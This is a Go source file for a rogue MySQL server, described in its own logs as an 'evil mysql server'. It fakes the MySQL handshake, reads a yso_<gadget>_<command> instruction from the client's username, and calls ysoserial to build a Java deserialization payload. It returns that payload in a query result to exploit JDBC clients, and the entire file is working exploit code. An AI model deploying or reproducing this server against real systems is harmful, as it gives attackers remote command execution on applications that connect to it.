package main

import (
	"bufio"
	"bytes"
	"encoding/hex"
	"errors"
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"strings"
)

var addr = flag.String("addr", "0.0.0.0:3306", "listen addr")
var javaBinPath = flag.String("java", "java", "java bin path")
var ysoserialPath = flag.String("ysoserial", "ysoserial-0.0.6-SNAPSHOT-all.jar", "ysoserial bin path")

func init() {
	flag.Parse()
}

var (
	Greeting = BuildGreeting()
	OK       = []byte{
		0x00, // OK, 0x00
		0x00, // Length Coded Binary
		0x00, // Length Coded Binary
		0x02, // server status, length 2
		0x00,
		0x00, // waring, length 2
		0x00,
	}
	EOF = []byte{
		0xfe, // EOF, 0xfe
		0x00, // waring, length 2
		0x00,
		0x02, // server status, length 2
		0x00,
	}
)

type RequestQuery struct {
	Command   byte
	Statement string
}

func DecodeRequestQuery(req []byte) (*RequestQuery, error) {
	command := req[4:5][0]
	return &RequestQuery{
		Command:   command,
		Statement: string(req[5:]),
	}, nil
}

func BuildGreeting() []byte {
	greeting := make([]byte, 0)
	greeting = append(greeting, 0x0a) // protocol
	greeting = append(greeting, []byte("5.0.2")...)
	greeting = append(greeting, 0x00)
	greeting = append(greeting, 0x00, 0x00, 0x00, 0x00)                                     // thread id
	greeting = append(greeting, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x00)       // salt
	greeting = append(greeting, 0x0d, 0xa2)                                                 // server capabilities
	greeting = append(greeting, 0x21)                                                       // server language
	greeting = append(greeting, 0x02, 0x00)                                                 // server status
	greeting = append(greeting, 0x08, 0x00)                                                 // extended server capabilities
	greeting = append(greeting, 0x00)                                                       // auth plugin length
	greeting = append(greeting, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01) // unused
	greeting = append(greeting, 0x00)                                                       // salt
	greeting = append(greeting, 0x00)                                                       // auth plugin
	greeting = append(greeting, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)
	greeting = append(greeting, []byte("mysql_clear_password")...)
	greeting = append(greeting, 0x00)
	return greeting
}

func BuildPacket(packetNumber int, d []byte) []byte {
	if len(d) >= 16777216 {
		log.Panicf("[x] packet is to long\n")
		return nil
	}
	packetLengthHex := ReverseHex(fmt.Sprintf("%06x", len(d)))
	packetNumberHex := fmt.Sprintf("%02d", packetNumber)
	packetHex := packetLengthHex + packetNumberHex + hex.EncodeToString(d)
	packet, _ := hex.DecodeString(packetHex)
	return packet
}

func BuildColumnHeaderPacket(column string) []byte {
	packet := make([]byte, 0)
	packet = append(packet, StrEncode([]byte("def"))...)  // catalog
	packet = append(packet, 0x00)                         // schema
	packet = append(packet, StrEncode([]byte("a"))...)    // table
	packet = append(packet, StrEncode([]byte("a"))...)    // org_table
	packet = append(packet, StrEncode([]byte(column))...) // name
	packet = append(packet, StrEncode([]byte(column))...) // name
	packet = append(packet, 0x01)                         // filter1
	packet = append(packet, 0x3f, 0x00)                   // character_set
	packet = append(packet, 0x1c, 0x00, 0x00, 0x00)       // column_length
	packet = append(packet, 0xfc)                         // column_type
	packet = append(packet, 0xff, 0xff)                   // flags
	packet = append(packet, 0x00)                         // decimals
	packet = append(packet, 0x00, 0x00)                   // filler_2
	return packet
}

func BuildColumnValuesPacket(values [][]byte) []byte {
	finalValues := make([]byte, 0)
	for i := range values {
		finalValues = append(finalValues, StrEncode(values[i])...)
	}
	return finalValues
}

func ReverseHex(s string) string {
	a := func(s string) *[]rune {
		var b []rune
		for _, k := range []rune(s) {
			defer func(v rune) {
				b = append(b, v)
			}(k)
		}
		return &b
	}(s)

	for i := 0; i < len(*a); i += 2 {
		(*a)[i], (*a)[i+1] = (*a)[i+1], (*a)[i]
	}
	return string(*a)
}

func IntEncode(number int) (string, error) {
	if number < 256 {
		return ReverseHex(fmt.Sprintf("%02x", number)), nil
	} else if number < 65536 {
		return "fc" + ReverseHex(fmt.Sprintf("%04x", number)), nil
	} else if number < 16777216 {
		return "fd" + ReverseHex(fmt.Sprintf("%06x", number)), nil
	} else if number < 4294967296 {
		return "fe" + ReverseHex(fmt.Sprintf("%08x", number)), nil
	} else {
		return "", errors.New("length is too long")
	}
}

func StrEncode(d []byte) []byte {
	l, err := IntEncode(len(d))
	if err != nil {
		return nil
	}
	packetHex := l + hex.EncodeToString(d)
	packet, _ := hex.DecodeString(packetHex)
	return packet
}

func Write(conn net.Conn, d []byte) {
	if _, err := conn.Write(d); err != nil {
		log.Printf("[x] write packet error : %s\n", err.Error())
	} else {
		//log.Printf("[-] write packet : %s\n", hex.EncodeToString(d))
	}
}

func handleAccept(conn net.Conn) {
	defer conn.Close()
	// send greeting data
	Write(conn, BuildPacket(0, Greeting))
	log.Printf("[√] write greeting success.\n")

	reader := bufio.NewReader(conn)
	var firstPacket = true
	var username = ""

	for {
		buffer := make([]byte, 16384)
		read, err := reader.Read(buffer)
		if err != nil {
			log.Printf("[x] read packet error : %s\n", err.Error())
			return
		}

		if firstPacket {
			username = string(bytes.Split(buffer[36:], []byte{0})[0])
			log.Printf("[-] username: %s\n", username)
			Write(conn, BuildPacket(2, OK))
			firstPacket = false
			continue
		}

		buffer = buffer[0:read]
		requestQuery, err := DecodeRequestQuery(buffer)
		if err != nil {
			log.Printf("[x] decode request query error : %s\n", err.Error())
			return
		}
		if requestQuery.Command == 3 {
			log.Printf("[-] request query statement: %s\n", requestQuery.Statement)
			if strings.Contains(requestQuery.Statement, "SHOW SESSION STATUS") {
				if !strings.HasPrefix(username, "yso") {
					return
				}
				params := strings.Split(username, "_")
				if len(params) != 3 {
					log.Printf("[x] params len must be 3, but get: %d\n", len(params))
					continue
				}
				payload := params[1]
				command := params[2]

				cmd := exec.Command(*javaBinPath, "-jar", *ysoserialPath, payload, command)
				poc, err := cmd.CombinedOutput()
				if err != nil {
					log.Printf("[x] gen ysoserial poc error : %s\n", err.Error())
					return
				}

				// send column count packet
				Write(conn, BuildPacket(1, []byte{0x03}))

				// build column packet
				var columns = make([]byte, 0)
				columns = append(columns, BuildPacket(2, BuildColumnHeaderPacket("a"))...)
				columns = append(columns, BuildPacket(3, BuildColumnHeaderPacket("b"))...)
				columns = append(columns, BuildPacket(4, BuildColumnHeaderPacket("c"))...)

				// send columns packet
				Write(conn, columns)
				Write(conn, BuildPacket(5, EOF))

				// send column values packet
				Write(conn, BuildPacket(6, BuildColumnValuesPacket([][]byte{[]byte("1"), poc, []byte("2")})))
				Write(conn, BuildPacket(7, EOF))

				log.Printf("[√] write payload success.\n")
				return
			} else if strings.Contains(requestQuery.Statement, "SHOW VARIABLES") {
				// send column count packet
				Write(conn, BuildPacket(1, []byte{0x02}))

				// build column packet
				var columns = make([]byte, 0)
				columns = append(columns, BuildPacket(2, BuildColumnHeaderPacket("d"))...)
				columns = append(columns, BuildPacket(3, BuildColumnHeaderPacket("e"))...)

				// send columns packet
				Write(conn, columns)
				Write(conn, BuildPacket(5, EOF))

				// send column values packet
				Write(conn, BuildPacket(6, BuildColumnValuesPacket([][]byte{[]byte("max_allowed_packet"), []byte("67108864")})))
				Write(conn, BuildPacket(7, BuildColumnValuesPacket([][]byte{[]byte("system_time_zone"), []byte("UTC")})))
				Write(conn, BuildPacket(8, BuildColumnValuesPacket([][]byte{[]byte("time_zone"), []byte("SYSTEM")})))
				Write(conn, BuildPacket(9, BuildColumnValuesPacket([][]byte{[]byte("init_connect"), []byte("")})))
				Write(conn, BuildPacket(10, BuildColumnValuesPacket([][]byte{[]byte("auto_increment_increment"), []byte("1")})))
				Write(conn, BuildPacket(11, EOF))
			} else {
				Write(conn, BuildPacket(0, OK))
				Write(conn, BuildPacket(1, EOF))
			}
		}
	}
}

func Start() {
	listenAddr := *addr
	if !strings.Contains(listenAddr, ":") {
		listenAddr = "0.0.0.0:" + listenAddr
	}
	log.Printf("[-] evil mysql server listen on %s\n", listenAddr)
	ln, err := net.Listen("tcp", listenAddr)
	if err != nil {
		log.Printf("[x] listen error [%s]\n", err.Error())
		os.Exit(0)
	}
	for {
		conn, err := ln.Accept()
		if err != nil {
			log.Printf("[x] accept error [%s]\n", err.Error())
			continue
		}
		log.Printf("[+] new client connected : %s\n", conn.RemoteAddr().String())
		go handleAccept(conn)
	}
}

func main() {
	Start()
}
